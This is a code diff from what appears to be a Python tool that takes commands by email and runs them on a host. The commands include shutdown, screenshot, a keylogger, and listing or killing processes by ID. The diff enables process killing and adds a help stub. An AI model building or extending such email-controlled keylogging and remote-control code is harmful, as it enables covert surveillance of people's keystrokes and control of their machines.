@@ -15,15 +15,20 @@ def shutdown():
     os.system("shutdown -s -t 0")
 
 
+def help():
+    pass
+
+
 function_map = {
+    'help': help,
     'shutdown': shutdown,
     'screenshot': system_control.screenshot,
     # 'list_apps': resource_monitor.list_apps,
     # 'open_app': resource_monitor.open_app,
     # 'close_app': resource_monitor.close_app,
-    # 'list_processes': resource_monitor.list_processes,
-    # 'kill_process': resource_monitor.kill_process,
-    'keylog': keylogr.keylog,
+    'list_processes': resource_monitor.list_processes,
+    'kill_process': resource_monitor.kill_process,
+    'keylog': keylogr.keylog
 }
 
 
@@ -47,9 +52,10 @@ def request_handle(msg_list):
                     mail_handle_send.send_mail_success_execution(
                         recipient_mail, cmd)
                     function_map[cmd]()
-                elif cmd == 'help':
-                    mail_handle_send.send_mail_success_execution(
-                        recipient_mail, cmd)
+                elif 'kill_process' in cmd:
+                    pid_match = re.search(r'\d+', cmd)
+                    pid = pid_match.group()
+                    function_map[cmd.split(' ')[0]](int(pid))
                 else:
                     function_map[cmd]()
                     mail_handle_send.send_mail_success_execution(
